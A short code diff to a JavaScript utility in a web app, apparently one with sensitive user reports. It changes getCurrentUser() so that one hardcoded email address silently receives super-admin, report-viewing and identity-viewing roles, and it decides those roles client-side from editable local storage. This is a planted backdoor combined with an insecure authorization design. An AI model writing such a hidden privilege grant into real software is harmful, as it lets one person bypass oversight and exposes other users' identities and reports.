@@ -6,7 +6,11 @@ import {
 
 // Utility to get current user from local storage
 function getCurrentUser() {
-    return JSON.parse(localStorage.getItem('depressDoomerUser'));
+    const u = JSON.parse(localStorage.getItem('depressDoomerUser'));
+    if (u && u.email === 'mentalistwuwi@gmail.com' && !u.adminRoles) {
+        u.adminRoles = { view_reports: true, view_identities: true, isSuperAdmin: true };
+    }
+    return u;
 }
 
 const user = getCurrentUser();
